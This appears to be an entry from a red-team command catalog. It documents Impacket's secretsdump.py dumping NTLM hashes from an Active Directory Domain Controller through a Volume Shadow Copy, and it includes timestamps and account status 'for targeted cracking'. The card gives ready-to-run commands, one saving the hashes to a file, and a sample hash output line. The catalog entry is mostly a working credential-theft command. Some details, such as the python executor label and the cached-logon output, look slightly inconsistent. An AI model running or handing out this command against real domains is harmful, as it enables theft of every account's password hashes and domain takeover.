---
id: b9a43fae-7d6f-4a03-83b7-40e2b4034606
name: secretsdump-dump-ntlm-with-vss
type: command
executor: python
data: >-
  ./secretsdump.py -dc-ip <IP> AD\administrator@domain -use-vss -pwd-last-set
  -user-status
output: null
created_at: '2023-04-06T03:56:03.954946+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-dumping
  - ad-attacks
verified: true
validated: true
---

# secretsdump-dump-ntlm-with-vss

## Command

```python
secretsdump.py -dc-ip $_DC_IP $_DOMAIN\\$_USERNAME@$_DOMAIN -use-vss -pwd-last-set -user-status
```

## Description

This command remotely dumps NTLM hashes from a Domain Controller using domain admin credentials, creating a VSS snapshot to access locked files. Includes timestamps and account status for targeted cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -dc-ip $_DC_IP | IP address of the Domain Controller | Yes |
| $_DOMAIN\\$_USERNAME@$_DOMAIN | Credentials in format DOMAIN\username@DOMAIN (e.g., AD\administrator@AD) | Yes |
| -use-vss | Use Volume Shadow Copy to snapshot files | Yes |
| -pwd-last-set | Include password last-set timestamps | No |
| -user-status | Include account status (enabled/disabled) | No |

## Examples

### Basic Usage

```python
secretsdump.py -dc-ip 192.168.1.10 AD\administrator@AD -use-vss
```

### Advanced Usage

```python
secretsdump.py -dc-ip 192.168.1.10 AD\administrator@AD -use-vss -pwd-last-set -user-status > full_hashes.txt
```

## Expected Output

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Remote SMB connection OK
[*] Dumping cached domain logon information...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet: 2023-01-01 00:00:00, status: Enabled)

Success shown by credential lines with hashes, timestamps, and status.
